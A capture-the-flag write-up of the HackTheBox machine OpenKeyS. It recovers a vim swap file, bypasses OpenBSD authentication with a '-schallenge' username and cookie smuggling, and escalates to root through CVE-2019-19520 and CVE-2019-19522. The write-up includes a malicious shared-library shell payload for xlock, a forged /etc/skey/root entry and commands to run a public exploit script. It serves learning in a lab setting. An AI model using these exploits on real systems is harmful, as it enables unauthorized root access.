---
title: "HackTheBox — OpenKeyS Writeup"
date: 2020-12-16 11:40:00 +0530
categories: [HackTheBox,Linux Machines]
tags: [hackthebox, openkeys, ctf, openbsd, vim, CVE-2019-19521, CVE-2019-19520, CVE-2019-19522, auth_userokay, skey, xlock, authroot ]
image: /assets/img/Posts/OpenKeyS.png
---

> OpenKeyS gives us good insight and exposure on OpenBSD vulnerabilities, initial web enumeration leads us to a directory where we find a vim swap file, restoring the file contents we understand certain aspects on how authentication works for the login form. Next we use it with CVE-2019-19521 to reform and execute authentication bypass attack to retrieve a valid user's SSH key. For elevating privileges to root we exploit vulnerabilities out of CVE-2019-19520 and CVE-2019-19522, first by exploiting xlock we gain access to auth group and then abuse S/Key authentication to gain root shell.

## Reconnaissance

#### masscan & nmap

Starting off with `masscan` & `nmap` we discover two open TCP ports 22,80:

```shell
cfx:  ~/Documents/htb/openkeys
→ masscan -e tun0 -p1-65535 --rate 500 10.10.10.199 | tee masscan.ports

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-11-28 12:52:46 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 80/tcp on 10.10.10.199
Discovered open port 22/tcp on 10.10.10.199

cfx:  ~/Documents/htb/openkeys
→ nmap -sC -sV -p22,80 10.10.10.199
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-28 18:27 IST
Nmap scan report for 10.10.10.199
Host is up (0.093s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)
|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
|_  256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
80/tcp open  http    OpenBSD httpd
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.84 seconds
```

Banner grabbing on Port 80 from nmap doesn't give us anything interesting.

### Port 80: HTTP

Visiting the <http://10.10.10.199> we get redirected to index.php which presents a login page:

![website](/assets/img/Posts/OpenKeys/website.png)

Apart from website title which says `OpenKeyS - Retrieve your OpenSSH Keys` and a `Forget?` link which is non functional we don't see anything useful.

On trying random creds and some basic SQL injection queries we get `Authentication denied.` message.

#### Directory Fuzzing

Using `ffuf` to discover hidden files and directories:

```shell
cfx:  ~/Documents/htb/openkeys
→ ffuf -c -r -u http://10.10.10.199/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -e .txt,.php -fc 403

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.199/FUZZ
 :: Extensions       : .txt .php
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

js                      [Status: 200, Size: 582, Words: 156, Lines: 22]
images                  [Status: 200, Size: 589, Words: 160, Lines: 22]
includes                [Status: 200, Size: 711, Words: 211, Lines: 23]
css                     [Status: 200, Size: 697, Words: 215, Lines: 23]
index.php               [Status: 200, Size: 4837, Words: 110, Lines: 102]
fonts                   [Status: 200, Size: 1066, Words: 385, Lines: 26]
vendor                  [Status: 200, Size: 1522, Words: 635, Lines: 30]
:: Progress: [60348/60348] :: Job [1/1] :: 384 req/sec :: Duration: [0:02:37] :: Errors: 0 ::
```

#### include directory

Moving ahead with directory fuzzing we find `includes` directory, inside the directory we find two files `auth.php` and `auth.php.swp` :

![includes](/assets/img/Posts/OpenKeys/includes.png)

For further investing, we'll download both the files using `wget` and look into it.

### File recovery

It appears `auth.php` is empty however `auth.php.swp` looking like a vim swap file, Using strings we were able to confirm it's a vim swap file, along with it we also a potential username `jennifer` and the full path of auth.php which is `/var/www/htdocs/includes/auth.php`:

```shell
cfx:  ~/Documents/htb/openkeys
→ strings auth.php.swp
b0VIM 8.1
jennifer
openkeys.htb
/var/www/htdocs/includes/auth.php
3210
#"!
[..SNIP.]
```

We can restore the file using `vim -r auth.php.swp`, save it's contents in a new file using `w: recoverauth.php`

```php
cfx:  ~/Documents/htb/openkeys
→ cat recoverauth.php
<?php

function authenticate($username, $password)
{
    $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);
    system($cmd, $retcode);
    return $retcode;
}

function is_active_session()
{
    // Session timeout in seconds
    $session_timeout = 300;

    // Start the session
    session_start();

    // Is the user logged in?
    if(isset($_SESSION["logged_in"]))
    {
        // Has the session expired?
        $time = $_SERVER['REQUEST_TIME'];
        if (isset($_SESSION['last_activity']) &&
            ($time - $_SESSION['last_activity']) > $session_timeout)
        {
            close_session();
            return False;
        }
        else
        {
            // Session is active, update last activity time and return True
            $_SESSION['last_activity'] = $time;
            return True;
        }
    }
    else
    {
        return False;
    }
}

function init_session()
{
    $_SESSION["logged_in"] = True;
    $_SESSION["login_time"] = $_SERVER['REQUEST_TIME'];
    $_SESSION["last_activity"] = $_SERVER['REQUEST_TIME'];
    $_SESSION["remote_addr"] = $_SERVER['REMOTE_ADDR'];
    $_SESSION["user_agent"] = $_SERVER['HTTP_USER_AGENT'];
    $_SESSION["username"] = $_REQUEST['username'];
}

function close_session()
{
    session_unset();
    session_destroy();
    session_start();
}


?>
```
## Shell as jennifer

### Source Code Analysis

Looking at the `authenticate()` function we see it's using `escapeshellcmd` which denies the possibility of command injection.

> escapeshellcmd() escapes any characters in a string that might be used to trick a shell command into executing arbitrary commands. This function should be used to make sure that any data coming from user input is escaped before this data is passed to the exec() or system() functions, or to the backtick operator. Following characters are preceded by a backslash: &#;`|*?~<>^()[]{}$\, \x0A and \xFF. ' and " are escaped only if they are not paired. On Windows, all these characters plus % and ! are preceded by a caret (^).

```php
function authenticate($username, $password)
{
    $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);
    system($cmd, $retcode);
    return $retcode;
}
```

But we do see it's using `check_auth` file, we can download that file using `wget http://10.10.10.199/auth_helpers/check_auth` and take a look into it:

```shell
cfx:  ~/Documents/htb/openkeys
→ file check_auth
check_auth: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/libexec/ld.so, for OpenBSD, not stripped
```

Analysing the binary using radare & ghidra didn't help much, but using `strings` does reveal certain things like `auth_userokay`:

```shell
cfx:  ~/Documents/htb/openkeys
→ strings check_auth
/usr/libexec/ld.so
OpenBSD
libc.so.95.1
_csu_finish
exit
_Jv_RegisterClasses
atexit
auth_userokay
_end
AWAVAUATSH
t-E1
t7E1
ASAWAVAT
[..SNIP..]
atexit
_GLOBAL_OFFSET_TABLE_
auth_userokay
_end
_DYNAMIC
```

Quick google search on `auth_userokay` shows [**OpenBSD man page**] where we look at what it's used for.

> The auth_userokay() function provides a single function call interface. Provided with a user's name in name, and an optional style, type, and password, the auth_userokay() function returns a simple yes/no response. A return value of 0 implies failure; a non-zero return value implies success. If style is not NULL, it specifies the desired style of authentication to be used. If it is NULL then the default style for the user is used.

### CVE-2019-19521

#### Bypass the OpenBSD authentication

On searching for OpenBSD authentication vulnerability we come across this [**article**](https://www.secpod.com/blog/openbsd-authentication-bypass-and-local-privilege-escalation-vulnerabilities/) where it showcase multiple CVE's on OpenBSD, one of them is authentication Bypass vulnerability.

The authentication bypass vulnerability automatically waves through anyone accessing via the password option with the username
-schallenge, because the hyphen forces the operating system to interpret the word as a command line option for the program performing the authentication. The -schallenge option automatically grants the user access.

We can confirm this vulnerability by trying username as `-schallenge` and password `cfx` which authenticates us as user `-schallenge`. Looking at the output on successful login, it says `OpenSSH key not found for user -schallenge`.

Even though we can bypass the authentication it's not much useful as of now as we need to login as a valid user and then retrieve it's SSH key. Now the limitation of this vulnerability is that the username is fixed, so we need find a way to smuggle a valid username via logging in.

### OpenSSH key - jennifer

Turns out we can smuggle a valid username, looking at the `init_session()` function from the source code reveals that the username is being accepted from the php `$_REQUEST` array.

```shell
function init_session()
{
    $_SESSION["logged_in"] = True;
    $_SESSION["login_time"] = $_SERVER['REQUEST_TIME'];
    $_SESSION["last_activity"] = $_SERVER['REQUEST_TIME'];
    $_SESSION["remote_addr"] = $_SERVER['REMOTE_ADDR'];
    $_SESSION["user_agent"] = $_SERVER['HTTP_USER_AGENT'];
    $_SESSION["username"] = $_REQUEST['username'];
}
```

Looking a PHP [**documentation**](https://www.php.net/manual/en/reserved.variables.request.php) on `$_REQUEST`

> An associative array that by default contains the contents of $_GET, $_POST and $_COOKIE

It means we can smuggle our username inside cookie parameter as well, So next we'll intercept a login request and try inserting username `jennifer` inside cookie which we saw in the strings output of vim swap file.

Step 1: First we intercept the login POST request and send username in the cookie:

![s1](/assets/img/Posts/OpenKeys/s1.png)

Step 2: On forwarding the request we get redirected to `sshkey.php` and inside browser we see SSH key for `jennifer`

![s2](/assets/img/Posts/OpenKeys/s2.png)

![s3](/assets/img/Posts/OpenKeys/s3.png)

#### SSH - jennifer

We'll copy the key in a file and `chmod 600` the file, now we can use it SSH as jennifer:

```shell
cfx:  ~/Documents/htb/openkeys
→ ssh -i jennifer.key jennifer@10.10.10.199
Last login: Wed Jun 24 09:31:16 2020 from 10.10.14.2
OpenBSD 6.6 (GENERIC) #353: Sat Oct 12 10:45:56 MDT 2019

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

openkeys$ whoami
jennifer
openkeys$ id
uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
openkeys$ uname -a
OpenBSD openkeys.htb 6.6 GENERIC#353 amd64
```

#### Grabbing user.txt

```shell
openkeys$ cat user.txt
36ab21239a15c53*****************

```

## Elevating Priv: jennifer -> root

Going back to [**secpod article**](https://www.secpod.com/blog/openbsd-authentication-bypass-and-local-privilege-escalation-vulnerabilities/), apart from authentication bypass there were three more CVE's for local privilege escalation.

- CVE-2019-19519 : Local privilege escalation via su
- CVE-2019-19520 : Local privilege escalation via xlock
- CVE-2019-19522 : Local privilege escalation via S/Key and YubiKey

While first one doesn't seem to apply here, the second and third are worth looking at.

In CVE-2019-19520, xlock in OpenBSD 6.6 allows local users to gain the privileges of the auth group.

Gaining privileges of auth group using CVE-2019-19520 we can leverage CVE-2019-19522 where any local user with ‘auth’ group permission can gain full privileges of the root user due to incorrect operation of authorization mechanisms via ‘S/Key‘ and ‘YubiKey‘.

### AutoExploit

There is a [**script on Github**](https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot) which automates both the CVE's to give us root.

We'll download it and transfer it to the box using scp since we've SSH access:

```shell
cfx:  ~/Documents/htb/openkeys
→ scp -i jennifer.key openbsd-authroot jennifer@10.10.10.199:/tmp
openbsd-authroot                                                                                                                                            100% 4087    11.3KB/s   00:00
```

#### Root Shell

```shell
openkeys$ cd /tmp/
openkeys$ ls -la
total 16
drwxrwxrwt   2 root      wheel   512 Nov 28 13:55 .
drwxr-xr-x  13 root      wheel   512 Nov 28 13:45 ..
-rw-r--r--   1 jennifer  wheel  4087 Nov 28 13:55 openbsd-authroot
openkeys$ chmod +x openbsd-authroot

openkeys$ ./openbsd-authroot
openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)
[*] checking system ...
[*] system supports S/Key authentication
[*] id: uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
[*] compiling ...
[*] running Xvfb ...
[*] testing for CVE-2019-19520 ...
_XSERVTransmkdir: Owner of /tmp/.X11-unix should be set to root
[+] success! we have auth group permissions

WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).

[*] trying CVE-2019-19522 (S/Key) ...
Your password is: EGG LARD GROW HOG DRAG LAIN
otp-md5 99 obsd91335
S/Key Password:
openkeys# id
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
openkeys# ls
.Xdefaults  .composer   .cshrc      .cvsrc      .forward    .login      .profile    .ssh        .viminfo    dead.letter root.txt
openkeys# whoami
root
```

#### Grabbing root.txt

```shell
openkeys# cat root.txt
f3a553b1697050******************

```

### Manual Exploitation CVE-2019-19520

The vulnerability was originally discovered by Qualys research team and we'll use their [**Advisory**](https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt) to exploit it manually.

> xlock utility is used to lock the X server till the user enters the password at the keyboard. On OpenBSD, /usr/X11R6/bin/xlock is installed by default and has set-group-ID of ‘auth‘, but without ‘set-user-ID’. ‘set user ID’ and ‘set group ID’ are Unix access rights flags that allow users to run an executable with the permissions of the executable’s owner or group respectively.

The vulnerability exists within the xlock utility in OpenBSD within ‘xenocara/lib/mesa/src/loader/loader.c’ which mishandles dlopen function.

> On OpenBSD, /usr/X11R6/bin/xlock is installed by default and is set-group-ID "auth", not set-user-ID; the following check is therefore incomplete and should use issetugid() instead:

```shell
101 _X_HIDDEN void *
102 driOpenDriver(const char *driverName)
103 {
...
113    if (geteuid() == getuid()) {
114       /* don't allow setuid apps to use LIBGL_DRIVERS_PATH */
115       libPaths = getenv("LIBGL_DRIVERS_PATH");


openkeys$ which xlock | xargs ls -la
-rwxr-sr-x  1 root  auth  3138520 Oct 12  2019 /usr/X11R6/bin/xlock
```

Next, it tries to load the driver `swrast_dri.so` so we'll create a malicious `swrast_dri.c` which executes a shell, we'll take the code from Qualys POC and compile it, and run xlock which triggers our script, resulting in making our user a part of `auth` group:

```shell
openkeys$ cd ~
openkeys$ cat > swrast_dri.c << "EOF"
> #include <paths.h>
> #include <sys/types.h>
> #include <unistd.h>
> static void __attribute__ ((constructor)) _init (void) {
>     gid_t rgid, egid, sgid;
>     if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
>     if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);
>     char * const argv[] = { _PATH_KSHELL, NULL };
>     execve(argv[0], argv, NULL);
>     _exit(__LINE__);
> }
> EOF
openkeys$ ls
swrast_dri.c user.txt
openkeys$ gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c
openkeys$ env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &
[2] 98977
openkeys$ _XSERVTransmkdir: Owner of /tmp/.X11-unix should be set to root

openkeys$ env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66

openkeys$ id
uid=1001(jennifer) gid=11(auth) groups=1001(jennifer), 0(wheel)

```

### Manual Exploitation CVE-2019-19522

Now that we are a member of auth group, we can move ahead exploiting CVE-2019-19522 to gain root:

> If the S/Key or YubiKey authentication type is enabled (they are both installed by default but disabled), then a local attacker can exploit the privileges of the group "auth" to obtain the full privileges of the user "root" (because login_skey and login_yubikey do not verify that the files in /etc/skey and /var/db/yubikey belong to the correct user, and these directories are both writable by the group "auth")

Since the `/etc/skey` directory is writable by `auth` group, following the POC we'll write the config file for root and change permission to 600:

```shell
openkeys$ ls -ld /etc/skey/
drwx-wx--T  2 root  auth  512 Nov 28 18:47 /etc/skey/

openkeys$ echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root
openkeys$ chmod 0600 /etc/skey/root
```
Next, we clear the environment and set the terminal to run skey and use password `EGG LARD GROW HOG DRAG LAIN` which returns the root shell.

```shell
openkeys$ env -i TERM=vt220 su -l -a skey
otp-md5 99 obsd91335
S/Key Password:
openkeys# id
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
openkeys# whoami
root
openkeys# wc -c root.txt
      33 root.txt
openkeys# cat root.txt
f3a553b1697050******************

```

And we pwned the Box !

Thanks for reading, Suggestions & Feedback are appreciated !
